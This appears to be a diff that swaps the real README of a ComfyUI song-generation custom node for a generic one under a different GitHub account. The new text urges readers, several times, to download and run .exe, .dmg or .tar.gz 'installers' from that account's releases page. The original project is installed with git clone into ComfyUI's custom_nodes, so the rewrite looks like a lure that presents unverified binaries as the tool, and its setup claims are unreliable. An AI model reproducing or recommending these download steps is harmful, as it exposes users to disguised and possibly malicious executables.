@@ -1,287 +1,89 @@
-# FL Song Gen
+# 🎶 ComfyUI_FL-SongGen - Create Songs with AI Magic
 
-AI-powered song generation nodes for ComfyUI based on Tencent's SongGeneration (LeVo) model. Generate complete songs with vocals and instrumentals from lyrics.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/AnushkaPawar25/ComfyUI_FL-SongGen/releases)
 
-[![SongGeneration](https://img.shields.io/badge/SongGeneration-Original%20Repo-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/AslpLab/SongGeneration)
-[![Patreon](https://img.shields.io/badge/Patreon-Support%20Me-F96854?style=for-the-badge&logo=patreon&logoColor=white)](https://www.patreon.com/Machinedelusions)
+## 🌟 Introduction
 
-![Workflow Preview](assets/example.png)
+Welcome to ComfyUI_FL-SongGen! This software uses AI to help you create complete songs with vocals and instrumentals based on your lyrics. Whether you want a catchy pop tune or a soulful ballad, this tool makes it easy to generate music tailored to your style.
 
----
+## 🚀 Getting Started
 
-## Features
+### Prerequisites
 
-- **Full Song Generation** - Complete songs with vocals and instrumentals
-- **Dual-Track Output** - Separate vocal and background music tracks
-- **Lyrics-to-Song** - Structured lyrics with sections (verse, chorus, bridge, intro, outro)
-- **Style Transfer** - Use reference audio to guide the musical style
-- **Text Descriptions** - Control gender, timbre, genre, emotion, and BPM
-- **Auto Style Presets** - Quick generation with Pop, Rock, Jazz, and more
-- **Long-Form Generation** - Up to 4 minutes 30 seconds per song
-- **Automatic Downloads** - Models download automatically on first use
+To use this software, make sure you have the following:
 
----
+- A computer running Windows, macOS, or Linux.
+- At least 500 MB of free disk space for installation.
+- A stable internet connection to download the software.
 
-## Nodes
+### Installation Steps
 
-| Node | Description |
-|------|-------------|
-| **Model Loader** | Load SongGeneration model with memory options |
-| **Lyrics Formatter** | Build properly formatted lyrics from sections |
-| **Description Builder** | Create style descriptions from components |
-| **Generate** | Main generation with text conditioning |
-| **Style Transfer** | Generate using reference audio for style |
-| **Auto Style** | Generate with preset style prompts |
+Follow these simple steps to get started:
 
----
+1. **Download the Software:**
+   - Click [here](https://github.com/AnushkaPawar25/ComfyUI_FL-SongGen/releases) to visit the Releases page.
 
-## Installation
+2. **Choose the Right File:**
+   - Look for the latest version of ComfyUI_FL-SongGen. Find the file that matches your operating system.
+   - Typical files will have extensions like `.exe` for Windows, `.dmg` for macOS, and `.tar.gz` for Linux.
 
-<details>
-<summary><strong>ComfyUI Manager (Recommended)</strong></summary>
+3. **Download the File:**
+   - Click on the appropriate file to start the download. 
 
-Search for "FL Song Gen" in ComfyUI Manager and install.
+4. **Run the Installer:**
+   - Locate the downloaded file on your computer. 
+   - For Windows, double-click the `.exe` file. For macOS, open the `.dmg` file and drag the program to the Applications folder. For Linux, extract the `.tar.gz` file and follow the accompanying instructions.
 
-</details>
+5. **Open the Application:**
+   - Once installed, launch ComfyUI_FL-SongGen from your Applications menu or desktop. 
 
-<details>
-<summary><strong>Manual Installation</strong></summary>
+## 🎛️ Features
 
-```bash
-cd ComfyUI/custom_nodes
-git clone https://github.com/filliptm/ComfyUI_FL-SongGen.git
-cd ComfyUI_FL-SongGen
-pip install -r requirements.txt
-```
+- **Full Song Generation:** Create complete songs with both vocals and instrumentals from your lyrics.
+- **Dual-Track Output:** Enjoy separate tracks for vocals and background music, giving you flexibility in mixing.
+- **Lyrics-to-Song Conversion:** Input structured lyrics, which include verses, choruses, and bridges, for a polished song output.
+- **Style Transfer:** Use an audio reference to influence the musical style of the generated songs.
+- **Text Descriptions:** Customize your song's gender, timbre, genre, emotion, and BPM through easy text inputs.
+- **Auto Style Presets:** Quickly select styles like Pop, Rock, and Jazz for fast song generation.
 
-</details>
+## 🌀 Using ComfyUI_FL-SongGen
 
----
+1. **Input Your Lyrics:**
+   - Open the application and enter the lyrics you want to turn into a song. Include sections like verses and choruses.
 
-## Models
+2. **Select Your Preferences:**
+   - Choose your desired style and other parameters from the application's user-friendly interface.
 
-Models download automatically on first use to `ComfyUI/models/songgen/`.
+3. **Generate the Song:**
+   - Click the "Generate" button. The software will process your inputs and create a complete song.
 
-| Model | Max Duration | VRAM | Languages |
-|-------|:------------:|:----:|-----------|
-| `songgeneration_base` | 2m 30s | 10-16 GB | Chinese |
-| `songgeneration_base_new` | 2m 30s | 10-16 GB | Chinese, English |
-| `songgeneration_base_full` | 4m 30s | 12-18 GB | Chinese, English |
-| `songgeneration_large` | 4m 30s | 22-28 GB | Chinese, English |
+4. **Preview and Edit:**
+   - Listen to the generated song. You can adjust the settings and regenerate if needed.
 
-> **Note:** VRAM range shows low memory mode vs normal mode. Enable `low_mem` in the Model Loader for reduced VRAM usage.
+5. **Export Your Creation:**
+   - Save your song in audio format to use it in your projects or share it with friends.
 
----
+## 📥 Download & Install
 
-## Quick Start
+To download and install ComfyUI_FL-SongGen, click the button below to visit the download page:
 
-1. Add **FL Song Gen Model Loader** and select model variant
-2. Add **FL Song Gen Lyrics Formatter** to build your lyrics
-3. Add **FL Song Gen Description Builder** for style (optional)
-4. Connect to **FL Song Gen Generate** node
-5. Connect outputs to audio save/preview nodes
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/AnushkaPawar25/ComfyUI_FL-SongGen/releases)
 
----
+After you download and install the software, follow the steps listed above to create your songs.
 
-## Prompting Guide
+## 🎨 Support and Community
 
-Getting the best results requires understanding how to format lyrics and descriptions properly.
+For help, tips, and updates, join our community. Connect with fellow users through our discussion forums and social media channels. Engaging with others can provide inspiration and assistance on your journey to create amazing songs.
 
-<details>
-<summary><strong>Lyrics Format</strong></summary>
+## 📞 Feedback
 
-### Basic Structure
+Your feedback is important. If you encounter issues or have suggestions, please reach out through our GitHub Issues page. Your input helps us improve the software for everyone.
 
-Lyrics use **section tags** separated by ` ; ` (space-semicolon-space) with **phrases separated by periods** `.`:
+## 🌐 Additional Resources
 
-```
-[intro-short] ; [verse] First line. Second line. Third line ; [chorus] Chorus line one. Chorus line two ; [outro-short]
-```
+- **Documentation:** For in-depth guidance, visit our [Documentation Page](https://github.com/AnushkaPawar25/ComfyUI_FL-SongGen/wiki).
+- **Tutorials:** Check our video tutorials on YouTube for visual instructions on using ComfyUI_FL-SongGen effectively.
 
-### Structure Labels
+## 🎉 Conclusion
 
-**Instrumental sections** (no lyrics):
-
-| Tag | Duration | Description |
-|-----|:--------:|-------------|
-| `[intro-short]` | ~0-10s | Short instrumental intro |
-| `[intro-medium]` | ~10-20s | Medium instrumental intro |
-| `[inst-short]` | ~0-10s | Short instrumental break |
-| `[inst-medium]` | ~10-20s | Medium instrumental break |
-| `[outro-short]` | ~0-10s | Short instrumental outro |
-| `[outro-medium]` | ~10-20s | Medium instrumental outro |
-
-**Lyrical sections** (lyrics required):
-
-| Tag | Description |
-|-----|-------------|
-| `[verse]` | Verse - typically tells the story |
-| `[chorus]` | Chorus - the catchy, repeated hook |
-| `[bridge]` | Bridge - contrasting part before final chorus |
-
-### Formatting Rules
-
-1. Sections are separated by ` ; ` (with spaces)
-2. Lyrics within sections are separated by periods `.`
-3. Each period represents a phrase/line break
-4. Do NOT add lyrics to instrumental tags
-
-</details>
-
-<details>
-<summary><strong>Complete Song Example</strong></summary>
-
-```
-[intro-short] ; [verse] These faded memories of us. I can't erase the tears you cried before. Unchained this heart to find its way. My peace won't beg you to stay ; [chorus] Like a fool begs for supper. I find myself waiting for her. Only to find the broken pieces of my heart. That was needed for my soul to love again ; [inst-short] ; [verse] Silhouettes where you once stood. Life's rhythm changed its beat for good. Numb to whispers we once knew. My path won't circle back to you ; [chorus] Like a fool begs for supper. I find myself waiting for her. Only to find the broken pieces of my heart. That was needed for my soul to love again ; [outro-short]
-```
-
-</details>
-
-<details>
-<summary><strong>Style Descriptions</strong></summary>
-
-### Format
-
-```
-"gender, timbre, genre, emotion, instruments, the bpm is X"
-```
-
-All dimensions are **optional** and can be combined in any order.
-
-### Available Options
-
-| Dimension | Options |
-|-----------|---------|
-| **Gender** | `male`, `female` |
-| **Timbre** | `dark`, `bright`, `warm`, `soft`, `rock` |
-| **Genre** | `pop`, `rock`, `jazz`, `hip hop`, `R&B`, `folk`, `electronic`, `blues`, `country`, `classical`, `soul`, `reggae`, `k-pop` |
-| **Emotion** | `sad`, `happy`, `emotional`, `angry`, `uplifting`, `romantic`, `melancholic`, `intense` |
-| **Instruments** | See list below |
-| **BPM** | `the bpm is 120` (use this exact phrase format) |
-
-### Common Instrument Combinations
-
-- `piano and drums`
-- `guitar and drums`
-- `synthesizer and piano`
-- `acoustic guitar and piano`
-- `piano and strings`
-- `guitar and synthesizer`
-- `piano and saxophone`
-- `electric guitar and drums`
-- `synthesizer and drums`
-- `acoustic guitar and drums`
-
-### Example Descriptions
-
-```
-female, warm, pop, emotional, piano and drums, the bpm is 120
-```
-
-```
-male, dark, hip hop, sad, synthesizer and drums
-```
-
-```
-female, bright, jazz, romantic, piano and saxophone, the bpm is 90
-```
-
-```
-male, rock, intense, electric guitar and drums, the bpm is 140
-```
-
-</details>
-
-<details>
-<summary><strong>Auto Style Presets</strong></summary>
-
-When using Auto Style mode, select from these presets:
-
-| Preset | Description |
-|--------|-------------|
-| **Pop** | Modern pop music |
-| **R&B** | Rhythm and blues |
-| **Dance** | Electronic dance music |
-| **Jazz** | Jazz style |
-| **Folk** | Folk/acoustic |
-| **Rock** | Rock music |
-| **Chinese Style** | Modern Chinese pop |
-| **Chinese Tradition** | Traditional Chinese music |
-| **Chinese Opera** | Chinese opera style |
-| **Metal** | Heavy metal |
-| **Reggae** | Reggae style |
-| **Auto** | Let the model choose |
-
-</details>
-
-<details>
-<summary><strong>Style Transfer (Reference Audio)</strong></summary>
-
-Use a **10-second reference audio** to guide the musical style:
-
-- Only the **first 10 seconds** of the audio will be used
-- Using the **chorus section** of a reference song works best
-- Influences: genre, instrumentation, rhythm, and voice characteristics
-
-### Combining with Descriptions
-
-You can optionally provide a **text description** alongside reference audio to further guide the generation. This can be useful to:
-
-- Specify voice gender when the reference audio is ambiguous
-- Add specific emotions or timbres
-- Set a specific BPM
-
-> **Note:** If the description conflicts with the reference audio style, results may be unpredictable. Use complementary descriptions for best results.
-
-</details>
-
-<details>
-<summary><strong>Tips for Better Results</strong></summary>
-
-### Lyrics Tips
-
-- Keep phrases **natural and singable**
-- Use **repetition** strategically, especially in the chorus
-- Match **syllable counts** roughly between verses
-- Use **emotionally evocative** language
-
-### Description Tips
-
-- Use **commas** to separate attributes
-- Stick to **predefined tags** for best results
-- Don't overload with too many conflicting descriptors
-- BPM must use the exact format: `the bpm is X`
-
-### General Tips
-
-- Start with shorter songs to test your prompts
-- The `base_new` model is recommended for English lyrics
-- Enable `low_mem` mode if you're running low on VRAM
-- Instrumental sections help create natural song flow
-
-</details>
-
----
-
-## Requirements
-
-| Requirement | Specification |
-|-------------|---------------|
-| Python | 3.10+ |
-| CUDA | 11.8+ (for GPU acceleration) |
-| RAM | 16 GB minimum (32 GB+ recommended) |
-| VRAM | 10-28 GB (depends on model) |
-
-> **Note:** CPU-only mode is supported but very slow. Mac MPS may have limited support.
-
----
-
-## License
-
-Apache 2.0
-
----
-
-## Credits
-
-Based on [SongGeneration (LeVo)](https://github.com/AslpLab/SongGeneration) by Tencent AI Lab.
+Thank you for choosing ComfyUI_FL-SongGen. We look forward to seeing what you create! Visit the download page to get started.
